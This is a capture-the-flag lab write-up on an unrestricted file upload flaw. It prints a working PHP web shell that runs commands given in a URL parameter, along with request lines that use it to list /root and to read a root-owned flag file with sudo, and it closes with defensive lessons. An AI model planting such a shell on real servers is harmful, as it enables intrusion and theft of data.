# Lab 09 - n0s4n1ty 1

## Category

Web Exploitation

## Difficulty

Easy

## Main Concept

Unrestricted File Upload

## Challenge Description

In this lab, the website provided a profile picture upload feature. The goal was to test whether the upload function properly validated file types. Since the challenge mentioned that the flag was located in the `/root` directory, I needed to upload a file that could help inspect the server and read the flag.

## Vulnerability

The application allowed a PHP file to be uploaded through the profile picture upload form. This means the server did not properly restrict uploaded file extensions or validate the real file type. Because the uploaded file was stored in a web-accessible directory, it could be executed by the server.

## Steps to Solve

First, I opened the challenge website and found a profile upload form.

Then I created a PHP file named:

```text
shell.php
```

The file contained a simple command execution script:

```php
<?php
echo "PHP OK<br>";

if (isset($_GET["cmd"])) {
    echo "<pre>";
    system($_GET["cmd"]);
    echo "</pre>";
}
?>
```

Next, I uploaded `shell.php` using the profile upload form.

After uploading the file, I opened the uploaded file from the `/uploads` directory:

```text
/uploads/shell.php
```

To confirm that the PHP file was working, I tested command execution with:

```text
/uploads/shell.php?cmd=whoami
```

The command returned the current web server user, which confirmed that the uploaded PHP file was being executed.

After that, I checked the root directory using:

```text
/uploads/shell.php?cmd=ls%20/root
```

Then I read the flag file using:

```text
/uploads/shell.php?cmd=sudo%20cat%20/root/flag.txt
```

The server displayed the flag.

## Flag

```text
CYLAB{PUT_YOUR_FLAG_HERE}
```

## Lesson Learned

This lab demonstrates the danger of unrestricted file upload. A website should never trust uploaded files only based on the filename or extension. Developers should validate file types, restrict dangerous extensions, rename uploaded files, store uploads outside the web root, and prevent uploaded files from being executed by the server.

## Status

Completed
